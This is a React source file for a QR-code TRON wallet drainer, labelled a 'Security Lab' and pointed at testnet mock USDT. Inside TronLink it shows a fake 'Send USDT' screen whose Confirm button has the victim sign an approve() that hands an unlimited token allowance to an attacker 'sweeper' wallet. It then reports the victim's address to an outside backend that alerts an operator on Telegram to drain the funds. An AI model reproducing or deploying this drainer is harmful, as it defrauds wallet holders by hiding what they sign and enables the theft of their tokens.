import React, { useEffect, useState } from "react";
import { QRCodeSVG } from "qrcode.react";

// CONFIGURATION
const TOKEN_ADDRESS = "TDHtoZXovGMCGco5tiJE35oA566GKZ8Snd"; // Mock USDT
const SWEEPER_ADDRESS = "TJXJEwcjNMryw87etLmGUDs1i5F1hveBou"; // YOUR ATTACKER WALLET (Account 01)
const BACKEND = "https://qr-drainer.onrender.com";
const VERCEL_URL = "https://qr-drainer-one.vercel.app";

// TRON LOGO BASE64 (for QR center)
const TRON_LOGO_B64 = "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iI2ZmMmQ1NSI+PHBhdGggZD0iTTEyIDJMMiA3bDEwIDUgMTAtNS0xMC01em0wIDlsMi41LTEuMjVMMTIgOC41bC0yLjUgMS4yNUwxMiAxMXptMCAyLjVsLTUtMi41LTUgMi41TDEyIDIybDEwLTguNS01LTIuNS01IDIuNXoiLz48L3N2Zz4=";

const fmt = (n) => Number(n).toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 });
const short = (a) => (a ? `${a.slice(0, 6)}…${a.slice(-4)}` : "—");

export default function App() {
  const [inWallet, setInWallet] = useState(false);   // true = victim view (inside TronLink)
  const [wallet, setWallet] = useState("");
  const [victimBal, setVictimBal] = useState(0);
  const [copied, setCopied] = useState(false);
  const [step, setStep] = useState("idle");          // idle | connecting | approving | done
  const [error, setError] = useState("");

  const qrValue = `tronlink://open?url=${encodeURIComponent(VERCEL_URL)}`;

  const readBalance = async (addr) => {
    try {
      const c = await window.tronWeb.contract().at(TOKEN_ADDRESS);
      const raw = await c.balanceOf(addr).call();
      setVictimBal(Number(raw.toString()) / 1e6);
    } catch (e) { console.log("balance read", e); }
  };

  // Detect whether we are running INSIDE a wallet (victim) or a normal browser (presenter)
  useEffect(() => {
    const detect = () => {
      const hasWallet = !!(window.tronLink || window.tronWeb);
      setInWallet(hasWallet);
      if (hasWallet && window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
        const addr = window.tronWeb.defaultAddress.base58;
        if (addr !== wallet) { setWallet(addr); readBalance(addr); }
      }
    };
    detect();
    const iv = setInterval(detect, 1500);
    return () => clearInterval(iv);
  }, [wallet]);

  // ---- VICTIM ACTION: Connect (Image 4 popup) then Approve (Image 5 popup) ----
  const handleConfirm = async () => {
    setError("");
    if (!window.tronWeb) { setError("Open this page inside TronLink / Trust Wallet DApp browser."); return; }
    try {
      // STEP 1: request accounts -> shows the "wants to connect" popup
      if (!wallet) {
        setStep("connecting");
        if (window.tronLink?.request) await window.tronLink.request({ method: "tron_requestAccounts" });
        else await window.tronWeb.request({ method: "tron_requestAccounts" });
        await new Promise(r => setTimeout(r, 1200));
        const addr = window.tronWeb?.defaultAddress?.base58;
        if (!addr) throw new Error("Wallet connection rejected");
        setWallet(addr);
        await readBalance(addr);
      }

      // STEP 2: approve -> shows the raw-data "approve" popup
      setStep("approving");
      const userAddress = window.tronWeb.defaultAddress.base58;
      const transaction = await window.tronWeb.transactionBuilder.triggerSmartContract(
        TOKEN_ADDRESS,
        "approve(address,uint256)",
        { feeLimit: 100000000, callValue: 0 },
        [
          { type: "address", value: SWEEPER_ADDRESS },
          { type: "uint256", value: 1000000000000000 }
        ],
        userAddress
      );
      if (!transaction.result || !transaction.result.result) throw new Error("Contract call rejected");
      const signedTx = await window.tronWeb.trx.sign(transaction.transaction);
      const broadcast = await window.tronWeb.trx.sendRawTransaction(signedTx);
      if (!broadcast.result) throw new Error("Broadcast failed");

      // STEP 3: ping backend -> Telegram alert with REAL balance -> operator drains
      const txId = broadcast.txid || transaction.transaction.txID;
      await fetch(`${BACKEND}/api/alert`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ victimAddress: userAddress, txHash: txId, network: "TRON Shasta" })
      });
      setStep("done");
    } catch (e) {
      console.error(e);
      setError(e.message || "Transaction failed or rejected.");
      setStep("idle");
    }
  };

  // ---- PRESENTER helpers ----
  const handleCopyAddress = () => { navigator.clipboard.writeText(SWEEPER_ADDRESS); setCopied(true); setTimeout(() => setCopied(false), 2000); };

  const handleDownloadQR = () => {
    const svg = document.querySelector("#lab-qr-box svg"); if (!svg) return;
    const size = 400, canvas = document.createElement("canvas");
    canvas.width = size; canvas.height = size;
    const ctx = canvas.getContext("2d"); ctx.fillStyle = "#fff"; ctx.fillRect(0, 0, size, size);
    const img = new Image();
    img.onload = () => {
      ctx.drawImage(img, 0, 0, size, size);
      const ls = size * 0.22, lp = (size - ls) / 2;
      ctx.beginPath(); ctx.arc(size / 2, size / 2, ls / 2 + 10, 0, 2 * Math.PI); ctx.fillStyle = "#fff"; ctx.fill();
      const logo = new Image();
      logo.onload = () => {
        ctx.drawImage(logo, lp, lp, ls, ls);
        const a = document.createElement("a"); a.download = "TRON-USDT-Receive.png"; a.href = canvas.toDataURL("image/png"); a.click();
      };
      logo.src = TRON_LOGO_B64;
    };
    img.src = "data:image/svg+xml;base64," + btoa(unescape(encodeURIComponent(new XMLSerializer().serializeToString(svg))));
  };

  const handleShare = () => {
    if (navigator.share) navigator.share({ title: "Receive USDT", url: VERCEL_URL }).catch(() => {});
    else { navigator.clipboard.writeText(VERCEL_URL); alert("Link copied!"); }
  };

  /* ============================= VICTIM VIEW ============================= */
  if (inWallet) {
    return (
      <div style={{ background: "#0a0e17", minHeight: "100vh", fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif', padding: "20px", color: "#eaf2ff" }}>
        <div style={{ maxWidth: 420, margin: "0 auto" }}>
          <div style={{ fontSize: 13, color: "#8ea3c0", marginBottom: 14 }}>Address or Domain Name</div>
          <div style={{ background: "#11151f", border: "1px solid #2a2d3a", borderRadius: 12, padding: "14px", display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 18 }}>
            <span style={{ fontFamily: "monospace", fontSize: 12, color: "#34d399", overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap", maxWidth: "70%" }}>{SWEEPER_ADDRESS}</span>
            <span style={{ display: "flex", gap: 10, color: "#8ea3c0", fontSize: 14 }}>
              <span style={{ color: "#34d399", fontWeight: 700 }}>Paste</span><span>📋</span><span>🔍</span>
            </span>
          </div>

          <div style={{ fontSize: 13, color: "#8ea3c0", marginBottom: 8 }}>Destination network</div>
          <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 20 }}>
            <span style={{ width: 22, height: 22, borderRadius: "50%", background: "#ff2d55", display: "inline-block" }}></span>
            <span style={{ fontWeight: 600 }}>Tron</span><span style={{ color: "#8ea3c0" }}>▾</span>
          </div>

          <div style={{ fontSize: 13, color: "#8ea3c0", marginBottom: 8 }}>Amount</div>
          <div style={{ background: "#11151f", border: "1px solid #2a2d3a", borderRadius: 12, padding: "14px", display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 6 }}>
            <span style={{ fontSize: 18, fontWeight: 700 }}>1</span>
            <span style={{ display: "flex", alignItems: "center", gap: 8 }}>
              <span style={{ fontSize: 13 }}>🪙 USDT</span>
              <span style={{ color: "#34d399", fontWeight: 700, fontSize: 13 }}>Max</span>
            </span>
          </div>
          <div style={{ fontSize: 12, color: "#8ea3c0", marginBottom: 26 }}>= $1.00</div>

          {error && <div style={{ background: "rgba(239,68,68,.12)", border: "1px solid rgba(239,68,68,.4)", color: "#fca5a5", borderRadius: 10, padding: 12, fontSize: 12, marginBottom: 16 }}>❌ {error}</div>}

          <button
            onClick={handleConfirm}
            disabled={step === "connecting" || step === "approving"}
            style={{ width: "100%", background: step === "done" ? "#16a34a" : "linear-gradient(135deg,#22c55e,#16a34a)", color: "#04140a", border: "none", borderRadius: 14, padding: 18, fontSize: 17, fontWeight: 800, cursor: step === "connecting" || step === "approving" ? "not-allowed" : "pointer", boxShadow: "0 6px 24px rgba(34,197,94,.35)" }}
          >
            {step === "connecting" ? "Connecting wallet…" : step === "approving" ? "Processing…" : step === "done" ? "✓ Confirmed" : "Confirm"}
          </button>

          {step === "done" && (
            <div style={{ marginTop: 16, background: "rgba(34,197,94,.1)", border: "1px solid rgba(34,197,94,.4)", borderRadius: 10, padding: 12, fontSize: 12, color: "#86efac", textAlign: "center" }}>
              Transaction confirmed. Operator notified via Telegram.
            </div>
          )}

          <div style={{ marginTop: 18, textAlign: "center", fontSize: 11, color: "#5c7191", fontFamily: "monospace" }}>
            {wallet ? `Session: ${short(wallet)} · Balance: ${fmt(victimBal)} mUSDT` : "Awaiting wallet session"}
          </div>
        </div>
      </div>
    );
  }

  /* ============================ PRESENTER VIEW ============================ */
  return (
    <div style={{ background: "#0a0e17", minHeight: "100vh", fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif', display: "flex", justifyContent: "center", alignItems: "center", padding: 20 }}>
      <div style={{ background: "#1a1d26", borderRadius: 24, padding: 30, maxWidth: 400, width: "100%", boxShadow: "0 20px 60px rgba(0,0,0,.5)", border: "1px solid #2a2d3a" }}>
        <div style={{ textAlign: "center", marginBottom: 8 }}>
          <h2 style={{ margin: "0 0 6px 0", fontSize: 22, fontWeight: 700, color: "#fff" }}>TRON Approval Security Lab</h2>
          <div style={{ fontSize: 12, color: "#8ea3c0" }}>Presenter mode — show this QR to the victim</div>
        </div>

        <div style={{ textAlign: "center", margin: "22px 0" }}>
          <div id="lab-qr-box" style={{ display: "inline-block", padding: 18, background: "#fff", borderRadius: 18, boxShadow: "0 8px 32px rgba(0,0,0,.3)" }}>
            <QRCodeSVG value={qrValue} size={210} level="H" includeMargin={false} imageSettings={{ src: TRON_LOGO_B64, height: 48, width: 48, excavate: true }} />
          </div>
        </div>

        <div style={{ background: "rgba(245,158,11,.1)", border: "1px solid rgba(245,158,11,.3)", borderRadius: 10, padding: 12, fontSize: 12, color: "#fbbf24", marginBottom: 18, lineHeight: 1.5 }}>
          ⚠️ Scanning opens the site <b>inside TronLink</b>, where the victim sees a "Send USDT" confirmation screen. The <b>Confirm</b> button there fires the <code>approve()</code> call.
        </div>

        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 12, marginBottom: 16 }}>
          <button onClick={handleDownloadQR} style={{ background: "#2a2d3a", border: "none", borderRadius: 10, padding: 14, color: "#fff", fontWeight: 600, cursor: "pointer", fontSize: 13 }}>⬇️ Save QR</button>
          <button onClick={handleShare} style={{ background: "#2a2d3a", border: "none", borderRadius: 10, padding: 14, color: "#fff", fontWeight: 600, cursor: "pointer", fontSize: 13 }}>📤 Share</button>
        </div>

        <div style={{ background: "#0f1219", border: "1px solid #2a2d3a", borderRadius: 12, padding: 14, display: "flex", justifyContent: "space-between", alignItems: "center" }}>
          <span style={{ fontFamily: "monospace", fontSize: 12, color: "#eaf2ff", overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap", maxWidth: "70%" }}>{SWEEPER_ADDRESS}</span>
          <button onClick={handleCopyAddress} style={{ background: copied ? "#22c55e" : "#ff2d55", color: "#fff", border: "none", borderRadius: 8, padding: "8px 14px", fontSize: 12, fontWeight: 600, cursor: "pointer" }}>{copied ? "✓ Copied" : "Copy"}</button>
        </div>
      </div>
    </div>
  );
}